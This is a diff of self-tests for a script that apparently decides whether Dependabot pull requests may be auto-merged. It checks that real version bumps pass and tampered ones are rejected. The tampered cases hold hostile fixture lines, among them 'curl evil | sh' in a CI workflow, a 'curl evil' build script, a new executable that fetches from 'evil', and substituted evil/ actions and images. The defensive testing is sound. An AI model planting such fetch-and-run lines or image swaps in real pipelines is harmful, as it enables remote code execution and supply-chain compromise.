@@ -1262,6 +1262,114 @@ def self_test() -> int:
     assert not has_verification("## Verification\n\n- `command` → result\n")
     assert not has_verification("Verified locally: `make check` → 594 passed.")
 
+    bot_commit = {
+        "author": "dependabot[bot]",
+        "verified": True,
+        "message": "Bumps x\n---\nupdated-dependencies:\n"
+        "- dependency-name: x\n  update-type: version-update:semver-minor\n",
+    }
+    lock_bump = "\n".join(
+        _file(
+            "infrastructure/permanent/.terraform.lock.hcl",
+            '-  version     = "6.66.0"',
+            '+  version     = "6.68.0"',
+            '-    "h1:old=",',
+            '+    "h1:new=",',
+        )
+    )
+    version_bumps = "\n".join(
+        [
+            *_file(
+                ".github/workflows/rebuild-stack.yml",
+                f"-        uses: fluxcd/flux2/action@{'d' * 40} # v2.9.5",
+                f"+        uses: fluxcd/flux2/action@{'b' * 40} # v2.9.6",
+            ),
+            *_file(
+                "platform/local/git-server/Dockerfile",
+                f"-FROM alpine/git:v2.54.0@sha256:{'8' * 64}",
+                f"+FROM alpine/git:v2.54.0@sha256:{'a' * 64}",
+            ),
+            *_file("app/requirements.txt", "-flask==3.1.1", "+flask==3.1.2"),
+            *_file("app/package.json", '-    "tailwindcss": "3.4.19"', '+    "tailwindcss": "3.4.20"'),
+            *_file("app/package-lock.json", '-      "version": "3.4.19",', '+      "version": "3.4.20",'),
+            *_file("infrastructure/staging/versions.tf", '-      version = "~> 6.66"', '+      version = "~> 6.68"'),
+        ]
+    )
+    branch = "dependabot/terraform/infrastructure/permanent/x"
+    assert dependabot_bump_failures("app/dependabot", branch, [bot_commit], lock_bump) == []
+    assert dependabot_bump_failures("dependabot[bot]", branch, [bot_commit], version_bumps) == []
+    digest = {**bot_commit, "message": "Bumps alpine/git from `832b1cd` to `a4bb51f`."}
+    assert dependabot_bump_failures("app/dependabot", branch, [digest], version_bumps) == []
+    major = {**bot_commit, "message": bot_commit["message"].replace("minor", "major")}
+    not_bumps = {
+        "human author": ("ImranAdan", branch, [bot_commit], lock_bump),
+        "human branch": ("app/dependabot", "feature/x", [bot_commit], lock_bump),
+        "no commits": ("app/dependabot", branch, [], lock_bump),
+        "major": ("app/dependabot", branch, [major], lock_bump),
+        "pushed commit": (
+            "app/dependabot", branch, [bot_commit, {**bot_commit, "author": "someone"}], lock_bump,
+        ),
+        "unsigned": ("app/dependabot", branch, [{**bot_commit, "verified": False}], lock_bump),
+        "extra line": (
+            "app/dependabot",
+            branch,
+            [bot_commit],
+            "\n".join(_file(".github/workflows/ci.yml", "+        run: curl evil | sh")),
+        ),
+        "other action": (
+            "app/dependabot",
+            branch,
+            [bot_commit],
+            "\n".join(
+                _file(
+                    ".github/workflows/ci.yml",
+                    f"-        uses: actions/checkout@{'d' * 40} # v5",
+                    f"+        uses: evil/checkout@{'b' * 40} # v5",
+                )
+            ),
+        ),
+        "other image": (
+            "app/dependabot",
+            branch,
+            [bot_commit],
+            "\n".join(_file("x/Dockerfile", "-FROM python:3.13-slim", "+FROM evil/python:3.13-slim")),
+        ),
+        "script": (
+            "app/dependabot",
+            branch,
+            [bot_commit],
+            "\n".join(_file("app/package.json", '-    "build": "a"', '+    "build": "curl evil"')),
+        ),
+        "new file": (
+            "app/dependabot",
+            branch,
+            [bot_commit],
+            "\n".join(["diff --git a/x.sh b/x.sh", "new file mode 100755", "--- /dev/null", "+++ b/x.sh", "@@ -0,0 +1 @@", "+curl evil"]),
+        ),
+    }
+    for case, args in not_bumps.items():
+        assert dependabot_bump_failures(*args), case
+
+    permanent_lock = scope_findings(lock_bump)
+    assert any(category == "permanent-infrastructure" for category, _ in permanent_lock)
+    relaxed = dependabot_scope(permanent_lock)
+    assert not any(category == "permanent-infrastructure" for category, _ in relaxed), relaxed
+    assert decide(relaxed, rules, set(), None)[0] == "READY"
+    permanent_tf = scope_findings(
+        "\n".join(_file("infrastructure/permanent/main.tf", '-  version = "~> 6.66"', '+  version = "~> 6.68"'))
+    )
+    assert decide(dependabot_scope(permanent_tf), rules, set(), None)[0] == "PARK"
+    gate_file = scope_findings(
+        "\n".join(
+            _file(
+                ".github/workflows/autonomous-merge.yml",
+                f"-        uses: actions/checkout@{'d' * 40} # v5",
+                f"+        uses: actions/checkout@{'b' * 40} # v5",
+            )
+        )
+    )
+    assert decide(dependabot_scope(gate_file), rules, set(), None)[0] == "PARK"
+
     calls: list[tuple[str, ...]] = []
     original_gh = globals()["gh"]
 
